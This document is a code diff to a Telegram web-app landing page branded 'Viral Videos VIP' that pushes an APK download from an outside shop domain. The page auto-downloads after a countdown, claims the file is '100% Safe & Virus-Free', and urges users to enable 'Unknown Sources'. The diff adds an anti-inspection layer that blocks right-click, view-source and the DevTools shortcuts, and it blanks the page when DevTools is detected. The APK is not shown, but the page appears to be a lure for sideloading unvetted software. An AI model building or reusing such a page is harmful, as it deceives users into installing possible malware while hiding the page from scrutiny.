@@ -20,9 +20,13 @@
             justify-content: center;
             padding: 20px;
             overflow-x: hidden;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            -webkit-touch-callout: none;
         }
 
-        /* IMAGE PROTECTION */
         img {
             -webkit-user-drag: none;
             -webkit-touch-callout: none;
@@ -31,7 +35,6 @@
             pointer-events: none;
         }
 
-        /* RED GLOW BACKGROUND */
         .glow-bg {
             position: fixed;
             width: 500px; height: 500px;
@@ -50,7 +53,6 @@
             pointer-events: none;
         }
 
-        /* CARD */
         .card {
             background: #141414;
             border: 1px solid #1a1a1a;
@@ -69,7 +71,6 @@
             to { opacity: 1; transform: translateY(0); }
         }
 
-        /* BRAND HEADER */
         .brand {
             display: flex;
             align-items: center;
@@ -96,7 +97,6 @@
             letter-spacing: 3px;
         }
 
-        /* MEDIA CONTAINER */
         .media-container {
             position: relative;
             width: 100%;
@@ -132,7 +132,6 @@
             margin-left: 4px;
         }
 
-        /* TEXT */
         h1 {
             font-size: 20px;
             font-weight: 800;
@@ -147,7 +146,6 @@
         }
         .subtitle span { color: #E50914; font-weight: 600; }
 
-        /* VERSION BADGE */
         .version-badge {
             display: inline-block;
             background: rgba(229,9,20,0.1);
@@ -161,7 +159,6 @@
             letter-spacing: 0.5px;
         }
 
-        /* TIMER */
         .timer-box {
             display: inline-flex;
             align-items: center;
@@ -189,7 +186,6 @@
         }
         @keyframes spin { to { transform: rotate(360deg); } }
 
-        /* DOWNLOAD BUTTON */
         .btn-download {
             display: flex;
             align-items: center;
@@ -214,7 +210,6 @@
         .btn-download:active { transform: scale(0.97); }
         .btn-download svg { width: 18px; height: 18px; }
 
-        /* FEATURES ROW */
         .features {
             display: flex;
             justify-content: center;
@@ -245,7 +240,6 @@
             letter-spacing: 0.3px;
         }
 
-        /* NOTICE */
         .notice {
             font-size: 11px;
             color: #444;
@@ -254,7 +248,6 @@
         }
         .notice a { color: #E50914; text-decoration: none; }
 
-        /* AD CONTAINER */
         .ad-wrapper {
             margin-top: 20px;
             width: 100%;
@@ -271,7 +264,6 @@
             overflow: hidden;
         }
 
-        /* DIVIDER */
         .red-line {
             width: 40px;
             height: 2px;
@@ -279,7 +271,6 @@
             margin: 12px auto;
         }
 
-        /* BOTTOM BRANDING */
         .powered {
             font-size: 9px;
             color: #333;
@@ -296,65 +287,60 @@
     <div class="glow-bg-2"></div>
 
     <div class="card">
-        <!-- BRAND -->
         <div class="brand">
             <div class="brand-icon">V</div>
             <div class="brand-text">VIRAL</div>
         </div>
 
-        <!-- PREVIEW IMAGE -->
         <div class="media-container">
-            <img src="https://tgreward.shop/images/1.jpg" class="hero-banner" alt="Video Preview">
+            <img src="https://tgreward.shop/images/1.jpg" class="hero-banner" alt="Video Preview" draggable="false">
             <div class="play-btn-overlay"></div>
         </div>
 
-        <!-- INFO -->
         <h1>Viral Videos VIP</h1>
-        <p class="subtitle"><span>Exclusive</span> â€¢ Secure APK â€¢ ~3.7 MB</p>
+        <p class="subtitle"><span>Exclusive</span> &bull; Secure APK &bull; ~3.7 MB</p>
 
-        <div class="version-badge">V7 â€” EDITION</div>
+        <div class="version-badge">V7 &ndash; EDITION</div>
 
         <br>
 
-        <!-- TIMER -->
         <div class="timer-box" id="timerBox">
             Auto-download in <span class="count" id="countdown">5</span>s
         </div>
 
         <br><br>
 
-        <!-- DOWNLOAD BUTTON -->
         <button class="btn-download" onclick="triggerDownload()">
-            <svg fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 4v12m0 0l-4-4m4 4l4-4M4 18h16"/></svg>
+            <svg fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M12 4v12m0 0l-4-4m4 4l4-4M4 18h16"/>
+            </svg>
             DOWNLOAD APK NOW
         </button>
 
-        <!-- FEATURES -->
         <div class="features">
             <div class="feature">
-                <div class="feature-icon">ðŸ”’</div>
+                <div class="feature-icon">&#128274;</div>
                 <div class="feature-label">SECURE</div>
             </div>
             <div class="feature">
-                <div class="feature-icon">âš¡</div>
+                <div class="feature-icon">&#9889;</div>
                 <div class="feature-label">FAST</div>
             </div>
             <div class="feature">
-                <div class="feature-icon">ðŸš«</div>
+                <div class="feature-icon">&#128683;</div>
                 <div class="feature-label">NO VPN</div>
             </div>
             <div class="feature">
-                <div class="feature-icon">ðŸ†“</div>
+                <div class="feature-icon">&#127379;</div>
                 <div class="feature-label">FREE</div>
             </div>
         </div>
 
         <div class="notice">
-            100% Safe & Virus-Free. Enable <a href="#">"Unknown Sources"</a> in settings.
+            100% Safe &amp; Virus-Free. Enable <a href="#">"Unknown Sources"</a> in settings.
         </div>
     </div>
 
-    <!-- AD SECTION -->
     <div class="ad-wrapper">
         <div class="red-line"></div>
         <div class="ad-container">
@@ -367,30 +353,84 @@
     <div class="powered">POWERED BY TELEGRAM</div>
 
     <script>
-        // IMAGE PROTECTION
-        document.addEventListener('contextmenu', function(e) {
-            if (e.target.nodeName === 'IMG' || e.target.closest('.media-container')) {
-                e.preventDefault();
-            }
-        });
-        document.onkeydown = function(e) {
-            if (e.keyCode == 123 || 
-               (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 67 || e.keyCode == 74)) || 
-               (e.ctrlKey && e.keyCode == 85)) {
-                return false;
-            }
-        };
+        // ============================================================
+        //  PROTECTION LAYER
+        // ============================================================
 
-        // TELEGRAM WEB APP
+        // 1. Disable right-click everywhere
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        }, true);
+
+        // 2. Disable long-press context menu on mobile (touchstart hold)
+        document.addEventListener('touchstart', function(e) {
+            // track start time
+            e._touchStartTime = Date.now();
+        }, { passive: true });
+
+        document.addEventListener('touchend', function(e) {
+            // nothing needed, just prevent text selection popup
+        }, { passive: true });
+
+        // Prevent long-press callout on all elements
+        document.addEventListener('touchstart', function(e) {
+            e.target.style.webkitTouchCallout = 'none';
+        }, { passive: true });
+
+        // Kill long-press context via touchforcechange / contextmenu on touch
+        window.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }, true);
+
+        // 3. Block all keyboard dev-tool shortcuts
+        document.addEventListener('keydown', function(e) {
+            // F12
+            if (e.keyCode === 123) { e.preventDefault(); return false; }
+            // Ctrl+Shift+I / J / C  (DevTools)
+            if (e.ctrlKey && e.shiftKey && [73, 74, 67].includes(e.keyCode)) { e.preventDefault(); return false; }
+            // Ctrl+U  (View Source)
+            if (e.ctrlKey && e.keyCode === 85) { e.preventDefault(); return false; }
+            // Ctrl+S  (Save Page)
+            if (e.ctrlKey && e.keyCode === 83) { e.preventDefault(); return false; }
+            // Ctrl+A  (Select All)
+            if (e.ctrlKey && e.keyCode === 65) { e.preventDefault(); return false; }
+            // Ctrl+P  (Print)
+            if (e.ctrlKey && e.keyCode === 80) { e.preventDefault(); return false; }
+        }, true);
+
+        // 4. Detect DevTools open (desktop) — redirect or blank when opened
+        (function devToolsDetect() {
+            var threshold = 160;
+            function check() {
+                if (
+                    window.outerWidth - window.innerWidth > threshold ||
+                    window.outerHeight - window.innerHeight > threshold
+                ) {
+                    document.body.innerHTML = '';
+                    window.location.replace('about:blank');
+                }
+            }
+            setInterval(check, 1000);
+        })();
+
+        // 5. Disable text selection via CSS (JS backup)
+        document.onselectstart = function() { return false; };
+        document.ondragstart  = function() { return false; };
+
+        // ============================================================
+        //  APP LOGIC
+        // ============================================================
+
         const tg = window.Telegram.WebApp;
         tg.expand();
 
-        // DOWNLOAD URL WITH CACHE BUSTER
         const cacheBuster = new Date().getTime();
         const downloadUrl = "https://tgreward.shop/downloads/viralvideos.apk?v=" + cacheBuster;
 
         function triggerDownload() {
-            // Button animation
             const btn = document.querySelector('.btn-download');
             btn.style.transform = 'scale(0.96)';
             setTimeout(() => btn.style.transform = 'scale(1)', 150);
@@ -406,7 +446,7 @@
         document.addEventListener('DOMContentLoaded', () => {
             let timeLeft = 5;
             const countdownEl = document.getElementById('countdown');
-            const timerBox = document.getElementById('timerBox');
+            const timerBox    = document.getElementById('timerBox');
 
             const timer = setInterval(() => {
                 timeLeft--;
